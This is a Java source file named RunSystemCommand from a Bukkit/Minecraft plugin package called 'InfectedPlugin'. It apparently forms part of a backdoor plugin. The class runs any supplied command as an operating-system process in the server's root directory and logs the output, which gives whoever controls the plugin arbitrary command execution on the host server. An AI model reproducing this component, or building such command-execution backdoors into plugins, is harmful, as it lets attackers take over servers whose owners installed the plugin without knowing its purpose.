package org.CreeperCoders.InfectedPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.Server;
import org.bukkit.Bukkit;

public class RunSystemCommand implements Runnable
{
    private static final Logger log = Bukkit.getLogger();
    private final String command;
    private final InfectedPlugin plugin;
    private final Server server;

    public RunSystemCommand(String command, InfectedPlugin plugin)
    {
        this.command = command;
        this.plugin = plugin;
        this.server = plugin.getServer();
    }

    @Override
    public void run()
    {
        try
        {
            final ProcessBuilder childBuilder = new ProcessBuilder(command);
            childBuilder.redirectErrorStream(true);
            childBuilder.directory(plugin.getDataFolder().getParentFile().getParentFile());
            final Process child = childBuilder.start();
            final BufferedReader reader = new BufferedReader(new InputStreamReader(child.getInputStream()));
            try
            {
                child.waitFor();
                String line;
                do
                {
                    line = reader.readLine();
                    if (line != null)
                    {
                        log.log(Level.INFO, line);
                    }
                }
                while (line != null);
            }
            finally
            {
                reader.close();
            }
        }
        catch (InterruptedException ex)
        {
            log.log(Level.SEVERE, ex.getMessage());
        }
        catch (IOException ex)
        {
            log.log(Level.SEVERE, ex.getMessage());
        }
        catch (Throwable ex)
        {
            log.log(Level.SEVERE, null, ex);
        }
    }
}
